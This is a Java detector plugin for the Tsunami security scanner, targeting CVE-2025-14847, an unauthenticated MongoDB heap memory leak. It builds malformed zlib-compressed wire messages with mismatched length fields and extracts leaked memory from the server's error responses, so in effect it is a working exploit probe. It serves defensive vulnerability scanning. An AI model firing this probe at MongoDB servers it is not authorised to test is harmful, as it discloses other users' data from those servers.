package com.google.tsunami.plugins.detectors.cves.cve202514847;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.HostAndPort;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.TransportProtocol;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.Deflater;
import java.util.zip.Inflater;
import javax.inject.Inject;
import javax.net.SocketFactory;

/** Detects MongoDB unauthenticated memory leak (CVE-2025-14847). */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2025-14847 Detector",
    version = "0.1",
    description = "MongoDB out-of-bounds read of heap memory",
    author = "Alessandro Versari (alessandro.versari@doyensec.com)",
    bootstrapModule = Cve202514847DetectorBootstrapModule.class)
public final class Cve202514847Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final Set<String> EXCLUDED_FIELDS = Set.of("?", "a", "$db", "ping");

  private final Clock utcClock;
  private final SocketFactory socketFactory;

  @Inject
  Cve202514847Detector(
      @UtcClock Clock utcClock, @SocketFactoryInstance SocketFactory socketFactory) {
    this.utcClock = checkNotNull(utcClock);
    this.socketFactory = checkNotNull(socketFactory);
  }

  private static class ProbingDetails {
    String response = "";
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    ProbingDetails probingDetails = new ProbingDetails();
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isTransportProtocolTcp)
                .filter(this::isMongoDBService)
                .filter(service -> isServiceVulnerable(service, probingDetails))
                .map(service -> buildDetectionReport(targetInfo, service, probingDetails))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isTransportProtocolTcp(NetworkService service) {
    return TransportProtocol.TCP.equals(service.getTransportProtocol());
  }

  private boolean isMongoDBService(NetworkService service) {
    return "mongod".equals(service.getServiceName()) || "mongodb".equals(service.getServiceName());
  }

  private boolean isServiceVulnerable(NetworkService service, ProbingDetails probingDetails) {
    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(service.getNetworkEndpoint());

    try (Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort())) {
      socket.setSoTimeout(2000);

      OutputStream out = socket.getOutputStream();
      InputStream in = socket.getInputStream();

      for (int docLen = 20; docLen < 512; docLen++) {
        byte[] probe = buildProbe(docLen, docLen + 500);
        out.write(probe);
        out.flush();

        byte[] response = readMongoResponse(in);
        if (response.length == 0) {
          continue;
        }

        byte[] leaked = extractLeaks(response);
        if (leaked.length > 0) {
          probingDetails.response = new String(leaked, StandardCharsets.UTF_8);
          return true;
        }
      }
      return false;

    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Unable to communicate with %s.", hp);
      return false;
    }
  }

  private byte[] buildProbe(int docLen, int bufferSize) throws Exception {
    byte[] content = new byte[] {0x10, 'a', 0x00, 0x01, 0x00, 0x00, 0x00};

    ByteBuffer bson = ByteBuffer.allocate(4 + content.length);
    bson.order(ByteOrder.LITTLE_ENDIAN);
    bson.putInt(docLen);
    bson.put(content);

    ByteBuffer opMsg = ByteBuffer.allocate(4 + 1 + bson.position());
    opMsg.order(ByteOrder.LITTLE_ENDIAN);
    opMsg.putInt(0);
    opMsg.put((byte) 0);
    opMsg.put(bson.array());

    byte[] compressed = zlibCompress(opMsg.array());

    ByteBuffer payload =
        ByteBuffer.allocate(4 + 4 + 1 + compressed.length).order(ByteOrder.LITTLE_ENDIAN);
    payload.putInt(2013);
    payload.putInt(bufferSize);
    payload.put((byte) 2);
    payload.put(compressed);

    ByteBuffer header = ByteBuffer.allocate(16).order(ByteOrder.LITTLE_ENDIAN);
    header.putInt(16 + payload.position());
    header.putInt(1);
    header.putInt(0);
    header.putInt(2012);

    ByteArrayOutputStream out = new ByteArrayOutputStream();
    out.write(header.array());
    out.write(payload.array());
    return out.toByteArray();
  }

  private byte[] readMongoResponse(InputStream in) throws Exception {
    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    byte[] tmp = new byte[4096];

    int read;
    while ((read = in.read(tmp)) > 0) {
      buffer.write(tmp, 0, read);
      if (buffer.size() >= 4) {
        int msgLen =
            ByteBuffer.wrap(buffer.toByteArray(), 0, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
        if (buffer.size() >= msgLen) {
          break;
        }
      }
    }
    return buffer.toByteArray();
  }

  private byte[] extractLeaks(byte[] response) {
    if (response.length < 25) return new byte[0];

    try {
      ByteBuffer hdr = ByteBuffer.wrap(response).order(ByteOrder.LITTLE_ENDIAN);
      int msgLen = hdr.getInt(0);
      int opcode = hdr.getInt(12);

      byte[] raw;
      if (opcode == 2012) {
        raw = zlibDecompress(response, 25, msgLen - 25);
      } else {
        raw = new byte[msgLen - 16];
        System.arraycopy(response, 16, raw, 0, raw.length);
      }

      String content = new String(raw, StandardCharsets.UTF_8);
      ByteArrayOutputStream leaks = new ByteArrayOutputStream();

      // Pass 1: Field names
      Matcher m1 = Pattern.compile("field name '([^']*)'").matcher(content);
      while (m1.find()) {
        String val = m1.group(1);
        if (!val.isEmpty() && !EXCLUDED_FIELDS.contains(val)) {
          leaks.write(val.getBytes());
        }
      }

      // Pass 2: Type bytes
      Matcher m2 = Pattern.compile("type (\\d+)").matcher(content);
      while (m2.find()) {
        String val = m2.group(1);
        if (!val.isEmpty() && !EXCLUDED_FIELDS.contains(val)) {
          leaks.write(val.getBytes());
        }
      }

      return leaks.toByteArray();
    } catch (Exception e) {
      return new byte[0];
    }
  }

  private byte[] zlibCompress(byte[] input) throws Exception {
    Deflater deflater = new Deflater();
    deflater.setInput(input);
    deflater.finish();

    ByteArrayOutputStream out = new ByteArrayOutputStream();
    byte[] buf = new byte[1024];
    while (!deflater.finished()) {
      int len = deflater.deflate(buf);
      out.write(buf, 0, len);
    }
    return out.toByteArray();
  }

  private byte[] zlibDecompress(byte[] data, int off, int len) throws Exception {
    Inflater inflater = new Inflater();
    inflater.setInput(data, off, len);

    ByteArrayOutputStream out = new ByteArrayOutputStream();
    byte[] buf = new byte[1024];
    while (!inflater.finished()) {
      int n = inflater.inflate(buf);
      if (n == 0) {
        break;
      }
      out.write(buf, 0, n);
    }
    return out.toByteArray();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2025_14847"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2025-14847"))
            .setSeverity(Severity.HIGH)
            .setTitle("MongoDB Memory Leak (MongoBleed) - CVE-2025-14847")
            .setDescription(
                "Mismatched length fields in Zlib compressed protocol headers may allow a read of "
                    + "uninitialized heap memory by an unauthenticated client.")
            .setRecommendation("Update MongoDB to a patched version.")
            .build());
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService service, ProbingDetails probingDetails) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(service)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            getAdvisories().get(0).toBuilder()
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setDescription("Response (first 100 bytes)")
                        .setTextData(TextData.newBuilder().setText(probingDetails.response))
                        .build())
                .build())
        .build();
  }
}
